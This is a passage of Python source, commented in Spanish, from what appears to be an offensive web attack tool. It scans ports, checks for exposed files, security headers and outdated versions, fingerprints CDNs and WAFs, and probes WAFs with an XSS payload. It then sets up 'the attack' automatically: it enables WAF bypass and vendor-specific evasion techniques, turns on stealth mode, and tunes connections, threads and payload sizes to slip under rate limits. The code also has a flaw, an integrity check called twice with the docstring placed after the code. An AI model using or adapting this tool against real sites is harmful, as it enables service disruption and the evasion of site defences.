                    "port": port,
                    "state": "open",
                    "service": service,
                    "protocol": "tcp"
                }
                open_ports_info.append(port_info)
                print_color(f"  ✓ Puerto {port} abierto - {service}", Colors.GREEN)
                log_message("INFO", f"Puerto {port} abierto ({service})")
        except Exception as e:
            if DEBUG_MODE:
                log_message("DEBUG", f"Error escaneando puerto {port}: {e}")
            continue
    
    OPEN_PORTS = open_ports_info
    return open_ports_info

def detect_service_by_port(port: int) -> str:
    """Detecta servicio común por puerto"""
    common_services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS",
        995: "POP3S", 1723: "PPTP", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Proxy",
        8443: "HTTPS-Alt", 9100: "JetDirect"
    }
    return common_services.get(port, "Unknown")

def analyze_security_headers(response_headers: Dict) -> Dict:
    """Analiza security headers HTTP incluyendo detección de rate limiting"""
    global SECURITY_HEADERS
    
    security_headers_check = {
        "strict-transport-security": False,
        "content-security-policy": False,
        "x-frame-options": False,
        "x-content-type-options": False,
        "x-xss-protection": False,
        "referrer-policy": False,
        "permissions-policy": False,
        "x-permitted-cross-domain-policies": False,
        # Headers de rate limiting
        "x-ratelimit-limit": None,
        "x-ratelimit-remaining": None,
        "x-ratelimit-reset": None,
        "retry-after": None,
        "rate-limit": None,
        "rate-limit-policy": None
    }
    
    headers_lower = {k.lower(): v for k, v in response_headers.items()}
    
    # Verificar cada header de seguridad
    if "strict-transport-security" in headers_lower:
        security_headers_check["strict-transport-security"] = True
        security_headers_check["hsts_max_age"] = extract_hsts_max_age(headers_lower["strict-transport-security"])
    
    if "content-security-policy" in headers_lower:
        security_headers_check["content-security-policy"] = True
    
    if "x-frame-options" in headers_lower:
        security_headers_check["x-frame-options"] = True
        security_headers_check["x_frame_options_value"] = headers_lower["x-frame-options"]
    
    if "x-content-type-options" in headers_lower:
        security_headers_check["x-content-type-options"] = True
    
    if "x-xss-protection" in headers_lower:
        security_headers_check["x-xss-protection"] = True
    
    if "referrer-policy" in headers_lower:
        security_headers_check["referrer-policy"] = True
    
    if "permissions-policy" in headers_lower or "feature-policy" in headers_lower:
        security_headers_check["permissions-policy"] = True
    
    if "x-permitted-cross-domain-policies" in headers_lower:
        security_headers_check["x-permitted-cross-domain-policies"] = True
    
    # Detectar headers de rate limiting
    rate_limit_headers = [
        "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
        "retry-after", "rate-limit", "rate-limit-policy",
        "x-rate-limit-limit", "x-rate-limit-remaining", "x-rate-limit-reset"
    ]
    
    for header in rate_limit_headers:
        if header in headers_lower:
            security_headers_check[header] = headers_lower[header]
    
    SECURITY_HEADERS = security_headers_check
    return security_headers_check

def extract_hsts_max_age(hsts_header: str) -> Optional[int]:
    """Extrae max-age de HSTS header"""
    try:
        match = re.search(r'max-age=(\d+)', hsts_header, re.IGNORECASE)
        if match:
            return int(match.group(1))
    except:
        pass
    return None

def scan_vulnerabilities(target_url: str, headers: Dict, content: str, server: str = None) -> List[Dict]:
    """Escanea vulnerabilidades web comunes"""
    global VULNERABILITIES
    
    print_color("🔍 Escaneando vulnerabilidades...", Colors.YELLOW, True)
    vulnerabilities = []
    
    # 1. Verificar archivos y directorios expuestos
    exposed_files = check_exposed_files(target_url)
    vulnerabilities.extend(exposed_files)
    
    # 2. Verificar información sensible en headers
    info_disclosure = check_information_disclosure(headers, server)
    vulnerabilities.extend(info_disclosure)
    
    # 3. Verificar configuraciones inseguras
    insecure_configs = check_insecure_configurations(headers, content)
    vulnerabilities.extend(insecure_configs)
    
    # 4. Verificar SSL/TLS (solo HTTPS)
    if PROTOCOL == "https":
        ssl_issues = check_ssl_tls_issues()
        vulnerabilities.extend(ssl_issues)
    
    # 5. Verificar versiones desactualizadas
    if server:
        outdated_versions = check_outdated_versions(server)
        vulnerabilities.extend(outdated_versions)
    
    VULNERABILITIES = vulnerabilities
    
    if vulnerabilities:
        print_color(f"  ⚠️ {len(vulnerabilities)} vulnerabilidad(es) detectada(s)", Colors.RED)
        for vuln in vulnerabilities[:5]:  # Mostrar primeras 5
            print_color(f"    - {vuln['title']}", Colors.YELLOW)
    else:
        print_color("  ✓ No se detectaron vulnerabilidades obvias", Colors.GREEN)
    
    return vulnerabilities

def check_exposed_files(target_url: str) -> List[Dict]:
    """Verifica archivos y directorios comúnmente expuestos"""
    common_files = [
        "/robots.txt", "/sitemap.xml", "/.git/config", "/.env", "/.htaccess",
        "/web.config", "/phpinfo.php", "/test.php", "/admin", "/administrator",
        "/wp-admin", "/wp-login.php", "/.git/", "/.svn/", "/.DS_Store",
        "/backup", "/backups", "/config.php", "/wp-config.php", "/config.json"
    ]
    
    vulnerabilities = []
    
    try:
        import requests
        base_url = target_url.rstrip('/')
        
        for file_path in common_files:
            url = f"{base_url}{file_path}"
            try:
                response = requests.get(url, timeout=3, verify=False, 
                                      headers={"User-Agent": "Mozilla/5.0"},
                                      allow_redirects=False)
                
                if response.status_code == 200:
                    severity = "HIGH" if any(x in file_path for x in [".env", ".git", "config.php", "wp-config"]) else "MEDIUM"
                    vulnerabilities.append({
                        "type": "exposed_file",
                        "severity": severity,
                        "title": f"Archivo/Directorio Expuesto: {file_path}",
                        "description": f"El archivo {file_path} es accesible públicamente (Status: {response.status_code})",
                        "url": url,
                        "recommendation": "Restringir acceso a archivos sensibles o remover archivos de prueba"
                    })
                    log_message("WARN", f"Archivo expuesto detectado: {url}")
            except:
                continue
    except ImportError:
        pass
    except Exception as e:
        if DEBUG_MODE:
            log_message("DEBUG", f"Error verificando archivos expuestos: {e}")
    
    return vulnerabilities

def check_information_disclosure(headers: Dict, server: str = None) -> List[Dict]:
    """Verifica divulgación de información en headers"""
    vulnerabilities = []
    
    # Server header con versión
    if server and server != "Unknown":
        if re.search(r'\d+\.\d+', server):
            vulnerabilities.append({
                "type": "information_disclosure",
                "severity": "LOW",
                "title": "Server Header con Versión",
                "description": f"El header Server expone la versión: {server}",
                "recommendation": "Ocultar versión del servidor en headers"
            })
    
    # X-Powered-By expone tecnología
    if "X-Powered-By" in headers:
        vulnerabilities.append({
            "type": "information_disclosure",
            "severity": "LOW",
            "title": "Header X-Powered-By Expuesto",
            "description": f"El header X-Powered-By expone: {headers['X-Powered-By']}",
            "recommendation": "Remover header X-Powered-By para ocultar tecnologías"
        })
    
    # PHP version en headers
    if "X-Powered-By" in headers and "PHP" in headers["X-Powered-By"]:
        php_version = re.search(r'PHP[/\s]+([0-9.]+)', headers["X-Powered-By"])
        if php_version:
            vulnerabilities.append({
                "type": "information_disclosure",
                "severity": "MEDIUM",
                "title": "Versión de PHP Expuesta",
                "description": f"Versión de PHP expuesta: {php_version.group(1)}",
                "recommendation": "Ocultar versión de PHP para prevenir ataques dirigidos"
            })
    
    return vulnerabilities

def check_insecure_configurations(headers: Dict, content: str) -> List[Dict]:
    """Verifica configuraciones inseguras"""
    vulnerabilities = []
    headers_lower = {k.lower(): v for k, v in headers.items()}
    
    # Missing security headers
    if not headers_lower.get("strict-transport-security"):
        vulnerabilities.append({
            "type": "missing_security_header",
            "severity": "MEDIUM",
            "title": "HSTS No Configurado",
            "description": "Falta el header Strict-Transport-Security",
            "recommendation": "Implementar HSTS para forzar HTTPS"
        })
    
    if not headers_lower.get("content-security-policy"):
        vulnerabilities.append({
            "type": "missing_security_header",
            "severity": "MEDIUM",
            "title": "Content-Security-Policy No Configurado",
            "description": "Falta el header Content-Security-Policy",
            "recommendation": "Implementar CSP para prevenir XSS"
        })
    
    if not headers_lower.get("x-frame-options"):
        vulnerabilities.append({
            "type": "missing_security_header",
            "severity": "MEDIUM",
            "title": "X-Frame-Options No Configurado",
            "description": "Falta el header X-Frame-Options",
            "recommendation": "Implementar X-Frame-Options para prevenir clickjacking"
        })
    
    # X-XSS-Protection deshabilitado o mal configurado
    if "x-xss-protection" in headers_lower:
        xss_protection = headers_lower["x-xss-protection"]
        if "0" in xss_protection or "mode=block" not in xss_protection.lower():
            vulnerabilities.append({
                "type": "insecure_configuration",
                "severity": "LOW",
                "title": "X-XSS-Protection Mal Configurado",
                "description": f"X-XSS-Protection configurado incorrectamente: {xss_protection}",
                "recommendation": "Usar: X-XSS-Protection: 1; mode=block"
            })
    
    return vulnerabilities

def check_ssl_tls_issues() -> List[Dict]:
    """Verifica problemas de SSL/TLS"""
    vulnerabilities = []
    
    if PROTOCOL != "https":
        return vulnerabilities
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((DOMAIN, PORT), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=DOMAIN) as ssock:
                # Verificar versión de TLS
                version = ssock.version()
                if version in ["TLSv1", "TLSv1.1"]:
                    vulnerabilities.append({
                        "type": "weak_ssl",
                        "severity": "HIGH",
                        "title": "Versión TLS Débil",
                        "description": f"Se usa {version}, que está deprecado y es inseguro",
                        "recommendation": "Actualizar a TLS 1.2 o superior"
                    })
                
                # Verificar certificado
                cert = ssock.getpeercert()
                
                # Verificar si el certificado está próximo a expirar
                if cert.get("notAfter"):
                    try:
                        from dateutil import parser as date_parser
                        expire_date = date_parser.parse(cert["notAfter"])
                        days_until_expiry = (expire_date - datetime.now()).days
                        
                        if days_until_expiry < 30:
                            vulnerabilities.append({
                                "type": "certificate_issue",
                                "severity": "MEDIUM",
                                "title": "Certificado SSL Próximo a Expirar",
                                "description": f"El certificado expira en {days_until_expiry} días",
                                "recommendation": "Renovar certificado SSL inmediatamente"
                            })
                    except:
                        pass
    except Exception as e:
        if DEBUG_MODE:
            log_message("DEBUG", f"Error verificando SSL/TLS: {e}")
    
    return vulnerabilities

def check_outdated_versions(server_header: str) -> List[Dict]:
    """Verifica versiones desactualizadas conocidas"""
    vulnerabilities = []
    
    # Versiones conocidas vulnerables
    vulnerable_versions = {
        "Apache": {
            "< 2.4.57": ["CVE-2023-43622", "CVE-2023-45802"],
            "< 2.4.55": ["CVE-2023-27522"]
        },
        "nginx": {
            "< 1.25.0": ["CVE-2023-44487"],
            "< 1.23.0": ["CVE-2022-41741", "CVE-2022-41742"]
        },
        "PHP": {
            "< 8.1": ["Múltiples CVEs conocidos"],
            "< 8.0": ["CVE-2022-31630", "CVE-2022-31631"]
        }
    }
    
    # Intentar extraer versión del server header
    for server_type, versions in vulnerable_versions.items():
        if server_type.lower() in server_header.lower():
            version_match = re.search(r'([0-9]+\.[0-9]+(?:\.[0-9]+)?)', server_header)
            if version_match:
                detected_version = version_match.group(1)
                
                # Verificar contra versiones vulnerables
                for vulnerable_threshold, cves in versions.items():
                    threshold_version = vulnerable_threshold.replace("< ", "")
                    if compare_versions(detected_version, threshold_version) < 0:
                        vulnerabilities.append({
                            "type": "outdated_version",
                            "severity": "HIGH",
                            "title": f"{server_type} Versión Potencialmente Vulnerable",
                            "description": f"Versión detectada: {detected_version}. Versiones < {threshold_version} tienen CVEs conocidos",
                            "cves": cves,
                            "recommendation": f"Actualizar {server_type} a la versión más reciente"
                        })
                        break
    
    return vulnerabilities

def compare_versions(v1: str, v2: str) -> int:
    """Compara dos versiones (retorna -1 si v1 < v2, 0 si igual, 1 si v1 > v2)"""
    try:
        v1_parts = [int(x) for x in v1.split('.')]
        v2_parts = [int(x) for x in v2.split('.')]
        
        max_len = max(len(v1_parts), len(v2_parts))
        v1_parts.extend([0] * (max_len - len(v1_parts)))
        v2_parts.extend([0] * (max_len - len(v2_parts)))
        
        for i in range(max_len):
            if v1_parts[i] < v2_parts[i]:
                return -1
            elif v1_parts[i] > v2_parts[i]:
                return 1
        return 0
    except:
        return 0

def fingerprint_target() -> Dict:
    # Verificación de estado del sistema (requerida para fingerprint)
    system_ok = _validate_execution()
    if not system_ok:
        log_message("ERROR", "Sistema no disponible - no se puede realizar fingerprint")
        return {}
    
    # Verificación de integridad en tiempo de ejecución
    _check_runtime_integrity()
    
    # Verificación de integridad en tiempo de ejecución
    _check_runtime_integrity()
    """Hace fingerprint del target"""
    global TARGET, PROTOCOL, PORT, DOMAIN, IP_ADDRESS, TARGET_TYPE, NETWORK_TYPE
    
    print_color("🔍 Realizando fingerprint del target...", Colors.CYAN, True)
    
    fingerprint = {
        "target": TARGET,
        "domain": DOMAIN,
        "ip_address": IP_ADDRESS,
        "target_type": TARGET_TYPE,
        "network_type": NETWORK_TYPE,
        "protocol": PROTOCOL,
        "port": PORT,
        "timestamp": datetime.now().isoformat(),
        "server": None,
        "cdn": None,
        "waf": None,
        "framework": None,
        "technologies": [],
        "discovered_endpoints": [],
        "open_ports": [],
        "security_headers": {},
        "vulnerabilities": []
    }
    
    # Si es IP, hacer escaneo de puertos
    if TARGET_TYPE == "IP":
        if NETWORK_TYPE == "LOCAL":
            # Escaneo más completo para IPs locales
            open_ports = scan_ports_advanced(IP_ADDRESS)
            fingerprint["open_ports"] = open_ports
        
        # Descubrir endpoints
        discovered = discover_endpoints_local_ip(IP_ADDRESS)
        fingerprint["discovered_endpoints"] = discovered
        
        # Si se descubrieron endpoints, usar el primero para fingerprinting
        if discovered:
            primary_endpoint = discovered[0]
            if primary_endpoint.get("status_code"):
                TARGET = primary_endpoint["url"]
                PROTOCOL = primary_endpoint["protocol"]
                PORT = primary_endpoint["port"]
                # Actualizar también en fingerprint
                fingerprint["target"] = TARGET
                fingerprint["protocol"] = PROTOCOL
                fingerprint["port"] = PORT
                log_message("INFO", f"Usando endpoint principal: {TARGET}")
    
    # Detectar servidor web y analizar (con reintentos y timeout aumentado)
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Intentar con timeout más largo y reintentos
        max_retries = 3
        response = None
        for attempt in range(max_retries):
            try:
                response = requests.get(
                    TARGET, 
                    timeout=20,  # Timeout aumentado a 20 segundos
                    allow_redirects=True, 
                    verify=False, 
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                    stream=True  # Stream para no cargar todo en memoria
                )
                # Leer solo los headers primero
                response.raw.read(1)  # Forzar lectura inicial
                break  # Éxito, salir del loop
            except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout) as e:
                if attempt < max_retries - 1:
                    log_message("WARN", f"Timeout en intento {attempt + 1}/{max_retries}, reintentando...")
                    time.sleep(2)  # Esperar antes de reintentar
                else:
                    log_message("WARN", f"Timeout después de {max_retries} intentos - continuando con información limitada")
                    # Continuar sin response para no bloquear el proceso
                    response = None
                    break
            except Exception as e:
                log_message("WARN", f"Error en intento {attempt + 1}: {e}")
                if attempt < max_retries - 1:
                    time.sleep(1)
                else:
                    response = None
                    break
        
        if response:
            fingerprint["server"] = response.headers.get("Server", "Unknown")
            # Leer contenido solo si es necesario
            try:
                content = response.text[:1000] if hasattr(response, 'text') else ""
            except:
                content = ""
            fingerprint["framework"] = detect_framework(response.headers, content)
            fingerprint["technologies"] = detect_technologies(response.headers, content)
            
            # Analizar security headers
            security_headers = analyze_security_headers(response.headers)
            fingerprint["security_headers"] = security_headers
            
            # Escanear vulnerabilidades (con contenido limitado)
            try:
                full_content = response.text[:5000] if hasattr(response, 'text') else ""
            except:
                full_content = ""
            vulnerabilities = scan_vulnerabilities(TARGET, response.headers, full_content, 
                                                 fingerprint["server"])
            fingerprint["vulnerabilities"] = vulnerabilities
        else:
            # Si no hay response, continuar con valores por defecto
            fingerprint["server"] = "Unknown (timeout)"
            fingerprint["framework"] = None
            fingerprint["technologies"] = []
            fingerprint["security_headers"] = {}
            fingerprint["vulnerabilities"] = []
            log_message("WARN", "No se pudo obtener respuesta del servidor - continuando con fingerprint básico")
        
    except Exception as e:
        log_message("WARN", f"Error en fingerprint HTTP: {e}")
        # Continuar con fingerprint básico aunque haya errores
        if "server" not in fingerprint:
            fingerprint["server"] = "Unknown (error de conexión)"
        if "waf" not in fingerprint:
            fingerprint["waf"] = None
        if "cdn" not in fingerprint:
            fingerprint["cdn"] = None
    
    # Detectar CDN (solo para IPs públicas o dominios)
    if NETWORK_TYPE == "PUBLIC":
        try:
            fingerprint["cdn"] = detect_cdn()
        except Exception as e:
            log_message("WARN", f"Error detectando CDN: {e}")
            fingerprint["cdn"] = None
        
        try:
            waf_result = detect_waf_advanced()
            if waf_result and isinstance(waf_result, dict):
                # Verificar que waf_result es un diccionario y tiene las claves necesarias
                if waf_result.get("detected"):
                    fingerprint["waf"] = waf_result.get("name")
                else:
                    fingerprint["waf"] = None
            elif waf_result is None:
                fingerprint["waf"] = None
            else:
                # Si waf_result no es un dict, convertirlo o usar None
                log_message("WARN", f"Resultado WAF inesperado: {type(waf_result)}")
                fingerprint["waf"] = None
        except Exception as e:
            log_message("WARN", f"Error detectando WAF: {e}")
            fingerprint["waf"] = None
    else:
        fingerprint["cdn"] = None
        fingerprint["waf"] = None
        log_message("INFO", "Saltando detección de CDN/WAF para IP local")
    
    # Guardar fingerprint
    fingerprint_file = REPORTS_DIR / f"fingerprint_{DOMAIN.replace('.', '_').replace(':', '_')}.json"
    safe_write_file(fingerprint_file, fingerprint, mode="w")
    
    log_message("INFO", f"Fingerprint completado: {fingerprint_file}")
    return fingerprint

def detect_framework(headers: Dict, content: str) -> Optional[str]:
    """Detecta framework/CMS"""
    frameworks = {
        "wordpress": ["wp-content", "wp-includes", "WordPress"],
        "drupal": ["drupal", "Drupal"],
        "joomla": ["joomla", "Joomla"],
        "laravel": ["laravel_session", "laravel"],
        "django": ["csrftoken", "django"],
        "rails": ["_rails_session", "rails"],
        "react": ["react", "ReactDOM"],
        "angular": ["ng-", "angular"],
        "vue": ["vue", "__vue__"]
    }
    
    content_lower = content.lower()
    for framework, indicators in frameworks.items():
        if any(ind.lower() in content_lower for ind in indicators):
            return framework
        if any(ind.lower() in str(headers).lower() for ind in indicators):
            return framework
    
    return None

def detect_technologies(headers: Dict, content: str) -> List[str]:
    """Detecta tecnologías utilizadas"""
    technologies = []
    
    # Detectar por headers
    if "X-Powered-By" in headers:
        technologies.append(headers["X-Powered-By"])
    if "Server" in headers:
        technologies.append(headers["Server"])
    
    # Detectar por contenido
    content_lower = content.lower()
    tech_patterns = {
        "PHP": ["php", "<?php"],
        "ASP.NET": ["asp.net", "__viewstate"],
        "Node.js": ["node", "express"],
        "Python": ["python", "django", "flask"],
        "Java": ["java", "jsp", "servlet"],
        "nginx": ["nginx"],
        "Apache": ["apache"],
        "IIS": ["iis", "microsoft-iis"]
    }
    
    for tech, patterns in tech_patterns.items():
        if any(pattern in content_lower for pattern in patterns):
            if tech not in technologies:
                technologies.append(tech)
    
    return technologies

def detect_cdn() -> Optional[str]:
    """Detecta CDN utilizado"""
    cdns = {
        "cloudflare": ["cf-ray", "cloudflare"],
        "cloudfront": ["x-amz-cf-id", "cloudfront"],
        "fastly": ["fastly", "x-fastly-request-id"],
        "akamai": ["akamai", "x-akamai"],
        "maxcdn": ["maxcdn", "cf-ray"],
        "incapsula": ["x-iinfo", "incapsula"]
    }
    
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        try:
            response = requests.head(TARGET, timeout=15, allow_redirects=True, verify=False,
                                   headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            for cdn, indicators in cdns.items():
                if any(ind in str(headers_lower) for ind in indicators):
                    return cdn
        except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout):
            log_message("DEBUG", "Timeout detectando CDN - continuando")
        except:
            pass
    except:
        pass
    
    return None

def detect_waf_advanced() -> Optional[Dict]:
    """Detección avanzada de WAF"""
    print_color("🛡️ Detectando WAF...", Colors.YELLOW)
    
    waf_signatures = {
        "cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
        "aws_waf": ["x-amzn-requestid", "x-aws-waf"],
        "imperva": ["x-iinfo", "incapsula"],
        "akamai": ["akamai", "x-akamai-transformed"],
        "sucuri": ["x-sucuri-id", "sucuri"],
        "f5_bigip": ["x-f5-new", "f5"],
        "barracuda": ["barracuda"],
        "mod_security": ["mod_security"],
        "fortinet": ["fortigate"],
        "palo_alto": ["pan-", "palo"]
    }
    
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Intentar con timeout aumentado
        try:
            response = requests.get(TARGET, timeout=15, allow_redirects=True, verify=False,
                                   headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            for waf, signatures in waf_signatures.items():
                if any(sig in str(headers_lower) for sig in signatures):
                    log_message("INFO", f"WAF detectado: {waf}")
                    return {"name": waf, "detected": True, "mode": "count"}  # Asumiendo modo count
            
            # Probar con payload malicioso (con timeout aumentado)
            try:
                test_response = requests.get(f"{TARGET}/?test=<script>alert(1)</script>", timeout=10, verify=False,
                                           headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
                if test_response.status_code in [403, 406, 501]:
                    return {"name": "unknown", "detected": True, "mode": "block"}
            except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout):
                log_message("DEBUG", "Timeout probando payload WAF - continuando")
            except:
                pass
            
            log_message("INFO", "No se detectó WAF")
            return {"name": None, "detected": False}
        except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout):
            log_message("WARN", "Timeout detectando WAF - continuando sin detección")
            return {"name": None, "detected": False}
    except Exception as e:
        log_message("WARN", f"Error detectando WAF: {e}")
        return {"name": None, "detected": False}

# ============================================================================
# AUTO-CONFIGURACIÓN INTELIGENTE BASADA EN FINGERPRINT
# ============================================================================

def get_waf_specific_evasion(waf_name: str) -> Dict[str, bool]:
    """Retorna técnicas de evasión específicas para cada WAF"""
    waf_evasions = {
        "cloudflare": {
            "url_encoding": True,
            "case_variation": True,
            "parameter_pollution": True,
            "header_injection": True,
            "cookie_manipulation": True,
            "double_encoding": True,
            "unicode_normalization": True,
            "chunked_encoding": False,  # Cloudflare detecta esto
            "method_tampering": True,
            "protocol_mixing": False
        },
        "aws_waf": {
            "url_encoding": True,
            "case_variation": True,
            "parameter_pollution": True,
            "header_injection": True,
            "cookie_manipulation": True,
            "double_encoding": True,
            "unicode_normalization": True,
            "chunked_encoding": True,
            "method_tampering": True,
            "protocol_mixing": True
        },
        "imperva": {
            "url_encoding": True,
            "case_variation": True,
            "parameter_pollution": True,
            "header_injection": False,  # Imperva detecta esto
            "cookie_manipulation": True,
            "double_encoding": True,
            "unicode_normalization": True,
            "chunked_encoding": True,
            "method_tampering": True,
            "protocol_mixing": False
        },
        "akamai": {
            "url_encoding": True,
            "case_variation": True,
            "parameter_pollution": True,
            "header_injection": True,
            "cookie_manipulation": True,
            "double_encoding": True,
            "unicode_normalization": True,
            "chunked_encoding": False,
            "method_tampering": True,
            "protocol_mixing": True
        },
        "sucuri": {
            "url_encoding": True,
            "case_variation": True,
            "parameter_pollution": True,
            "header_injection": True,
            "cookie_manipulation": True,
            "double_encoding": True,
            "unicode_normalization": True,
            "chunked_encoding": True,
            "method_tampering": True,
            "protocol_mixing": True
        },
        "f5_bigip": {
            "url_encoding": True,
            "case_variation": True,
            "parameter_pollution": True,
            "header_injection": True,
            "cookie_manipulation": True,
            "double_encoding": True,
            "unicode_normalization": True,
            "chunked_encoding": True,
            "method_tampering": True,
            "protocol_mixing": True
        }
    }
    
    return waf_evasions.get(waf_name.lower(), {
        "url_encoding": True,
        "case_variation": True,
        "parameter_pollution": True,
        "header_injection": True,
        "cookie_manipulation": True,
        "double_encoding": True,
        "unicode_normalization": True,
        "chunked_encoding": True,
        "method_tampering": True,
        "protocol_mixing": True
    })

def auto_configure_from_fingerprint(fingerprint: Dict, waf_info: Optional[Dict] = None):
    """
    Auto-configura el ataque basado en el fingerprint del target.
    Activa automáticamente las mejores estrategias según lo detectado.
    """
    global WAF_BYPASS, STEALTH_MODE, USE_LARGE_PAYLOADS, ATTACK_MODE, RATE_ADAPTIVE
    global MAX_CONNECTIONS, MAX_THREADS, PAYLOAD_SIZE_KB, EVASION_TECHNIQUES
    
    print_color("\n🤖 Auto-configurando estrategia de ataque...", Colors.CYAN, True)
    changes = []
    
    # 1. Detección de WAF - Activar bypass automáticamente
    if waf_info and waf_info.get("detected"):
        waf_name = waf_info.get("name", "unknown")
        if not WAF_BYPASS:
            WAF_BYPASS = True
            changes.append(f"✅ WAF Bypass activado (WAF detectado: {waf_name})")
            log_message("INFO", f"Auto-activando WAF bypass - WAF detectado: {waf_name}")
        
        # Aplicar técnicas de evasión específicas por WAF
        waf_specific = get_waf_specific_evasion(waf_name)
        EVASION_TECHNIQUES.update(waf_specific)
        changes.append(f"✅ Técnicas de evasión optimizadas para {waf_name}")
        log_message("INFO", f"Técnicas de evasión configuradas para {waf_name}: {waf_specific}")
        
        # Ajustes específicos por tipo de WAF
        if waf_name == "cloudflare":
            # Cloudflare es muy agresivo, usar stealth mode
            if not STEALTH_MODE:
                STEALTH_MODE = True
                changes.append("✅ Stealth Mode activado (Cloudflare detectado)")
            # Reducir conexiones para evitar bloqueos
            MAX_CONNECTIONS = min(MAX_CONNECTIONS, 5000)
            changes.append(f"✅ Conexiones reducidas a {MAX_CONNECTIONS} (Cloudflare)")
            # Cloudflare detecta chunked encoding, desactivarlo
            EVASION_TECHNIQUES["chunked_encoding"] = False
        
        elif waf_name in ["aws_waf", "imperva", "akamai"]:
            # WAFs empresariales - usar payloads más pequeños y stealth
            if not STEALTH_MODE:
                STEALTH_MODE = True
                changes.append(f"✅ Stealth Mode activado ({waf_name})")
            PAYLOAD_SIZE_KB = min(PAYLOAD_SIZE_KB, 512)
            changes.append(f"✅ Payload reducido a {PAYLOAD_SIZE_KB}KB ({waf_name})")
            # Imperva detecta header injection
            if waf_name == "imperva":
                EVASION_TECHNIQUES["header_injection"] = False
    
    # 2. Detección de CDN
    cdn = fingerprint.get("cdn")
    if cdn:
        if cdn.lower() in ["cloudflare", "akamai", "fastly"]:
            # CDNs agresivos - usar stealth y rate adaptive
            if not STEALTH_MODE:
                STEALTH_MODE = True
                changes.append(f"✅ Stealth Mode activado (CDN: {cdn})")
            if not RATE_ADAPTIVE:
                RATE_ADAPTIVE = True
                changes.append(f"✅ Rate Adaptive activado (CDN: {cdn})")
            # Reducir carga inicial para evitar bloqueos
            MAX_CONNECTIONS = min(MAX_CONNECTIONS, 3000)
            changes.append(f"✅ Conexiones ajustadas a {MAX_CONNECTIONS} (CDN)")
    
    # 3. Detección de Rate Limiting (por headers de seguridad)
    security_headers = fingerprint.get("security_headers", {})
    rate_limit_headers = [
        "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
        "retry-after", "rate-limit", "rate-limit-policy",
        "x-rate-limit-limit", "x-rate-limit-remaining", "x-rate-limit-reset"
    ]
    has_rate_limit = any(security_headers.get(h) is not None for h in rate_limit_headers)
    
    if has_rate_limit:
        if not RATE_ADAPTIVE:
            RATE_ADAPTIVE = True
            changes.append("✅ Rate Adaptive activado (Rate Limiting detectado)")
        
        # Intentar extraer límite de rate limiting si está disponible
        rate_limit_value = None
        for header in ["x-ratelimit-limit", "x-rate-limit-limit", "rate-limit"]:
            if security_headers.get(header):
                try:
                    # Intentar extraer número del header
                    import re
                    match = re.search(r'(\d+)', str(security_headers[header]))
                    if match:
                        rate_limit_value = int(match.group(1))
                        break
                except:
                    pass
        
        # Ajustar conexiones según límite detectado
        if rate_limit_value:
            # Usar 80% del límite como máximo seguro
            safe_limit = int(rate_limit_value * 0.8)
            MAX_CONNECTIONS = min(MAX_CONNECTIONS, max(safe_limit, 500))
            changes.append(f"✅ Conexiones ajustadas a {MAX_CONNECTIONS} (Límite detectado: {rate_limit_value})")
        else:
            # Reducir velocidad inicial si no se puede determinar el límite
            MAX_CONNECTIONS = min(MAX_CONNECTIONS, 2000)
            changes.append(f"✅ Conexiones reducidas a {MAX_CONNECTIONS} (Rate Limiting detectado)")
    
    # 4. Detección de Framework y ajuste de payloads
    framework = fingerprint.get("framework")
    if framework:
        if framework.lower() in ["wordpress", "joomla", "drupal"]:
            # CMS - usar payloads más pequeños y específicos
            PAYLOAD_SIZE_KB = min(PAYLOAD_SIZE_KB, 256)
            changes.append(f"✅ Payload ajustado a {PAYLOAD_SIZE_KB}KB (CMS: {framework})")
        elif framework.lower() in ["nginx", "apache"]:
            # Servidores web simples - puede soportar más carga
            if not USE_LARGE_PAYLOADS:
                USE_LARGE_PAYLOADS = True
                changes.append(f"✅ Large Payloads activado (Servidor: {framework})")
    
    # 5. Detección de vulnerabilidades - ajustar modo de ataque
    vulnerabilities = fingerprint.get("vulnerabilities", [])
    if vulnerabilities:
        # Si hay vulnerabilidades, usar modo MIXED para probar diferentes vectores
        if ATTACK_MODE != "MIXED":
            ATTACK_MODE = "MIXED"
            changes.append("✅ Modo de ataque cambiado a MIXED (vulnerabilidades detectadas)")
    
    # 6. Detección de SSL/TLS - ajustar si es necesario
    protocol = fingerprint.get("protocol", "https")
    if protocol == "https":
        # HTTPS - puede necesitar más recursos
        if MAX_THREADS < 200:
            MAX_THREADS = min(MAX_THREADS * 2, 400)
            changes.append(f"✅ Threads ajustados a {MAX_THREADS} (HTTPS)")
    
    # Mostrar cambios aplicados
    if changes:
        print_color("📋 Cambios aplicados automáticamente:", Colors.GREEN)
        for change in changes:
            print_color(f"  {change}", Colors.CYAN)
    else:
        print_color("ℹ️ No se requirieron cambios automáticos", Colors.YELLOW)
    
    log_message("INFO", f"Auto-configuración completada - {len(changes)} cambios aplicados")

